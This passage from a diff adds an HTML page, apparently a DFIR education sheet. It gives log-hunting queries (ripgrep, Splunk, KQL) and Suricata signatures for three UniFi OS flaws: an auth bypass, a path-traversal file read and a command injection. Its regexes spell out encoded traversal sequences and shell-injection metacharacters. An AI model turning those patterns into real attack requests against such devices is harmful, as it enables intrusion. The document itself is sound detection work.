+rg -iN '/ucs/update[^ ]*(%3b|%7c|%60|%24%28|%0a|;|\||`|\$\()' access.log
+
+# The bypass fingerprint: auth-exempt prefix followed by encoded dot-dot into /proxy
+rg -iN '/api/auth/[^ ]*(\.\.|%2e%2e)(/|%2f).*proxy/' access.log</pre>
+
+<h3>Splunk</h3>
+<pre>index=unifi sourcetype=nginx:access
+| rex field=_raw "\"(?&lt;method&gt;\S+)\s+(?&lt;uri&gt;\S+)\s+HTTP"
+| where match(uri,"(?i)/(proxy|app-assets)/")
+    AND match(uri,"(?i)(\.\.|%2e%2e|\.%2e|%2e\.|%252e)(/|%2f|%5c|%252f)")
+| stats count min(_time) as first max(_time) as last values(status) as statuses by src_ip, uri</pre>
+
+<h3>Elastic / KQL</h3>
+<pre>url.original : (*proxy* or *app-assets*) and
+url.original : (*%2e%2e* or *..%2f* or *.%2e* or *%252e*)
+or (url.path : *\/ucs\/update* and url.query : (*%3b* or *%7c* or *%60* or *%24%28*))</pre>
+
+<h3>The "divergence" detection (most robust — mirrors the patch)</h3>
+<pre># Log BOTH raw and normalized, then alert when the captured service differs:
+# nginx:  log_format hunt '$remote_addr "$request" raw=$request_uri norm=$uri $status';
+# rule (pseudo): svc_raw  = capture( $request_uri , ^/(proxy|app-assets)/([a-z-]+)/ )
+#                svc_norm = capture( $uri         , ^/(proxy|app-assets)/([a-z-]+)/ )
+#                ALERT if svc_raw != svc_norm        # encoding-agnostic, ~0 FP</pre>
+
+<!-- ============ RULES ============ -->
+<h2 id="rules">IDS signatures (Suricata 6/7)</h2>
+<pre>alert http any any -&gt; $HOME_NET any (
+  msg:"CVE-2026-34908 UniFi OS auth bypass - encoded traversal into /proxy";
+  flow:established,to_server; http.request_line;
+  content:"/proxy/"; nocase;
+  pcre:"/(?:\.\.|%2e%2e|\.%2e|%2e\.|%252e)(?:\/|%2f|%5c|%252f)/i";
+  classtype:web-application-attack; reference:cve,2026-34908; sid:9000801; rev:1;)
+
+alert http any any -&gt; $HOME_NET any (
+  msg:"CVE-2026-34909 UniFi OS path traversal - encoded traversal into /app-assets (file read)";
+  flow:established,to_server; http.request_line;
+  content:"/app-assets/"; nocase;
+  pcre:"/(?:\.\.|%2e%2e|\.%2e|%2e\.|%252e)(?:\/|%2f|%5c|%252f)/i";
+  classtype:web-application-attack; reference:cve,2026-34909; sid:9000901; rev:1;)
+
+alert http any any -&gt; $HOME_NET any (
+  msg:"CVE-2026-34910 UniFi OS command injection - shell metachars in ucs update name";
+  flow:established,to_server; http.uri; content:"/ucs/update"; nocase;
+  pcre:"/(?:[;|&amp;`]|\$\(|\$\{|\|\||&amp;&amp;|%3b|%7c|%26|%60|%24%28|%0a|\bdpkg\b|\bsystemctl\b|\$\(IFS)/iU";
+  classtype:web-application-attack; reference:cve,2026-34910; sid:9001001; rev:1;)</pre>
+
+<div class="panel">
+  <b>Tuning &amp; truth-in-detection</b>
+  <ul style="margin:6px 0 0">
+    <li>These are <b>detection / virtual-patch</b> controls — the real fix is upgrading to <b>UniFi OS Server 5.0.8 / unifi-core 5.0.153</b>.</li>
+    <li>Add overlong-UTF-8 (<code>%c0%ae</code>) and triple-encoding variants if you want exhaustive coverage; the divergence check above sidesteps the encoding arms race.</li>
+    <li>Request/response <b>bodies are not in default access logs</b> — body-delivered 34910 payloads and the data 34909 exfiltrates need body logging or host-side (auditd/sudo) correlation.</li>
+  </ul>
+</div>
+
+<div class="footer">
+  Generated for DFIR education · UniFi OS SAB-064 (CVE-2026-34908 / 34909 / 34910) · 2026.
+  Three distinct sinks: <code>/proxy/</code> access bypass, <code>/app-assets/</code> file read, <code>ucs/update</code> command injection.
+  Sources: Ubiquiti Security Advisory Bulletin 064; vendor patch diff (5.0.6 → 5.0.8).
+</div>
+
+</div>
+</body>
+</html>
